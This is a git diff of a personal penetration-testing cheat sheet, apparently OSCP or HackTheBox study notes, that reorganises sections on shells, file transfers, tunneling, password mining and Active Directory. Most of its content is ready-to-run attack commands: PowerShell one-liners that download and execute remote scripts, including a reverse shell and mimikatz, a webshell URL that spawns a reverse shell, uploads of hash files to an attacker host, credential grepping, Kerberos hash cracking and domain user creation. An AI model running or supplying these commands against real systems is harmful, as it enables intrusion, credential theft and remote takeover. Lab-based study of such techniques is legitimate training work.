@@ -1,4 +1,7 @@
 # Web Apps
+### LFI Cheatsheet
+https://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html 
+
 ### WebDAV
 Manually test putting file for execution 
 `curl -X PUT http://10.10.10.15/df.aspx -d @test.txt ` 
@@ -17,6 +20,13 @@ http://10.10.10.15/0xdf.txt - the file to move
 `curl -X MOVE -H 'Destination:http://10.10.10.15/0xdf.aspx' http://10.10.10.15/0xdf.txt` 
 
 # Linux
+
+## Shells 
+[Escape restricted shell rshell](https://null-byte.wonderhowto.com/how-to/escape-restricted-shell-environments-linux-0341685/)
+
+### Escape restricted shell with sshpass
+`sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 -t bash` 
+
 ### Spawn shell via Python
 `python3 -c 'import pty;pty.spawn("/bin/bash")' `
 
@@ -31,30 +41,33 @@ reset: unknown terminal type unknown
 Terminal type? screen
 ``` 
 
-### grep for a string in a dir of files
-`grep -ls 'pass' ${PWD}/* `
+## Misconfig/Vulnerability specific commands 
+[VSFTd 2.3.4 exploit](https://0xdf.gitlab.io/2019/07/27/htb-lacasadepapel.html)
+
+[Samba username map script exploit](https://0xdf.gitlab.io/2020/04/07/htb-lame.html#samba-exploit)
 
 ### nmap scan for shellshock
 `nmap -sV -p 80 --script http-shellshock --script-args uri=/cgi-bin/user.sh 10.10.10.56` 
 
-### Escape restricted shell with sshpass
-`sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 -t bash` 
+------------------------------------------
+# Windows 
+
+## Crackmapexec
+https://wiki.porchetta.industries/
+
+`crackmapexec smb 10.10.10.161 -u '' -p ''`
+`crackmapexec smb 10.10.10.161 --pass-pol`
+`crackmapexec smb 10.10.10.161 --users`
+`crackmapexec smb 10.10.10.161 --groups`
+
+## Misconfig/Vulnerability specific commands 
+[Pre-Compiled Windows Exploits for common vulns](https://github.com/abatchy17/WindowsExploits)
 
 ### Mount an NFS share that has ACL applied (root squashing)
 ` sudo nfspysh -o server=10.10.11.191:/var/www/html` 
 
-------------------------------------------
-# Windows 
-
-### Fix $PATH on Windows (good if whoami, certutil and other exe's are "not recognized")
-`set PATH=%SystemRoot%\system32;%SystemRoot%;` 
-
-### Start SMB Server
-`smbserer.py -smb2support [SHARE_NAME] [SHARE_PATH]`
-`smbserver.py -smb2support a .`
-`copy \\10.10.14.15\a\file` 
-
-## RDP to Machine
+## Shells and Remote access 
+### RDP to Machine
 `xfreerdp +nego +sec-rdp +sec-tls +sec-nla /d: /u: /p: /v:[MACHINE_NAME] /u:[USERNAME] /p:[PASSWORD] /size:1180x708`
 `EX: xfreerdp +nego +sec-rdp +sec-tls +sec-nla /d: /u: /p: /v:manageengine /u:administrator /p:studentlab /size:1800x900`
 
@@ -64,7 +77,10 @@ if running as 32 bit, call the powershell from `C:\windows\sysNative` instead of
 Example - `C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadString('http%3a//10.10.14.10/rev.ps1')`  
 More info in writeup for [Optimum](https://0xdf.gitlab.io/2021/03/17/htb-optimum.html)
 
-## Webshell to reverse shell with powershell
+### Fix $PATH on Windows (good if whoami, certutil and other exe's are "not recognized")
+`set PATH=%SystemRoot%\system32;%SystemRoot%;` 
+
+### Webshell to reverse shell with powershell
 ```
 From Webshell, it’s time to get an interactive shell. I’ll go with my Windows stand-by, Nishang Invoke-PowerShellTcp.ps1.
 
@@ -75,14 +91,22 @@ Start nc -lnvp 443
 Visit: http://10.10.10.116/upload/0xdf.asp?cmd=powershell%20iex(New-Object%20Net.Webclient).downloadstring(%27http://10.10.14.15/Invoke-PowerShellTcp.ps1%27)
 ``` 
 
+## PrivEsc
+[living off the land binaries lolbas](https://lolbas-project.github.io/)
+
 --------------------------------------------
 # File Transfers 
+
+### Start SMB Server
+`smbserer.py -smb2support [SHARE_NAME] [SHARE_PATH]`
+`smbserver.py -smb2support a .`
+`copy \\10.10.14.15\a\file` 
 
 ### Powershell to upload to Kali
 `powershell (​New​-​Object System​.​Net​.​WebClient​)​.​UploadFile​(​'http://192.168.119.143/upload.php'​, 'C:\Tools\active_directory\hashes'​)`
 
 ### Powershell to grab remote file and run it in memory
-`powershell.exe -exec Bypass -​C "IEX (New-Object Net.WebClient).DownloadString('http://192.168.119.143:8000/mimikatz.exe');"`
+`powershell "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.12/Invoke-PowerShellTcp.ps1');"`
 
 ### Powershell Upload to kali - Make sure apache is running and the upload.php is there! 
 `powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.143/upload.php', 'asrep_hashes.txt')`
@@ -95,6 +119,10 @@ Visit: http://10.10.10.116/upload/0xdf.asp?cmd=powershell%20iex(New-Object%20Net
 
 --------------------------------------------
 # Tunneling 
+### SSH Port forwarding guide
+[SSH Tunneling](https://refabr1k.gitbook.io/oscp/info-gathering/ssh/ssh-tunneling)
+[Pivoting and Tunneling](https://medium.com/@kuwaitison/pivoting-and-tunneling-for-oscp-and-beyond-cheat-sheet-3435d1d6022)
+
 ### set up ssh port forwarding with compromised user - good if you cannot use chisel 
 `sudo ssh -L 80:192.168.120.209:80 <compromised_user>@192.168.120.209` 
 
@@ -127,7 +155,24 @@ USE CASE:
 
 
 --------------------------------------------------
-# Password cracking
+# Passwords
+## Password Mining
+### grep for a string in a dir of files bash 
+`grep -ls 'pass' ${PWD}/* `
+
+### Query for the string password in dir of files CMD 
+`findstr /si password *.txt` 
+ 
+### Find strings in config files CMD 
+`dir /s 'pass' == 'cred' == 'vnc' == *.config` 
+
+### View hidden files and directories CMD
+`dir /a:h`
+`dir /a:d` 
+
+## Password Cracking
+### Hashcat 
+[Hashcat Example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)
 
 ### Hashcat cracking krbtg5
 `hashcat -m 13100 --force -a 0 hashes.txt /usr/share/wordlists/rockyou.txt` 
@@ -136,6 +181,16 @@ USE CASE:
 
 ---------------------------------------------------
 # Active Directory 
+
+[AD PayloadAlltheThings Checklist](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)
+
+[Abusing Active Directory ACLs and ACEs](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
+
+[PowerView Cheatsheet](https://hackersinterview.com/oscp/oscp-cheatsheet-powerview-commands/)
+
+[Silver Ticket AD](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket#available-services)
+
+[Domain Escalation Resource Based Constrained Delegation](https://www.hackingarticles.in/domain-escalation-resource-based-constrained-delegation/)
 ​
 ### Add user to domain 
 `net user hacker password /add /domain` 
